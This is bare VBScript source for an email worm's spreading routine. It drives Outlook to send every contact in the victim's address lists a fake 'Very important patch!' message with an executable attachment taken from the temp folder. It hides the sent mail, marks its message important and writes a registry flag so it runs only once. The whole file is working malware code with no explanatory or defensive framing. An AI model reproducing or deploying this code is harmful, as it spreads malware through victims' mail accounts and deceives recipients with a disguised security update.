On Error Resume Next
Dim wsh
Set fso=CreateObject("Scripting.FileSystemObject")
Set wsh=CreateObject("WScript.Shell")
If wsh.RegRead("HKLM\Software\Microsoft\AppDataCfg\MAPI")="" Then
Set out=CreateObject("Outlook.Application")
Set map=out.GetNameSpace("MAPI")
Set al=map.AddressLists
For a=1 to al.Count
For c=1 to al(a).AddressEntries.Count
sendmail (al(a).AddressEntries(c))
Next
Next
End If
wsh.RegWrite "HKLM\Software\Microsoft\AppDataCfg\MAPI","done"
Sub sendmail(address As String)
On Error Resume Next
Set b=CreateObject("Outlook.Application").CreateItem(0)
b.To=address
b.Subject="Very important patch!"
b.Body="Hi. Here i've attached a very important patch, very useful "
b.Body=b.Body&"to find and fix a lot of bugs in windows and to "
b.Body=b.Body&"improve the security of your windows."&vbCrLf
b.Body=b.Body&"If installed, this patch it's able to prevent"
b.Body=b.Body&"virus infections or other dangerous things."&vbCrLf
b.Body=b.Body&"I hope that this will be useful! Bye!"
b.Attachments.Add fso.GetSpecialFolder(2)&"\Win_Security_Patch_2602.exe"
b.Importance=2
b.DeleteAfterSubmit=True
b.Send
End Sub
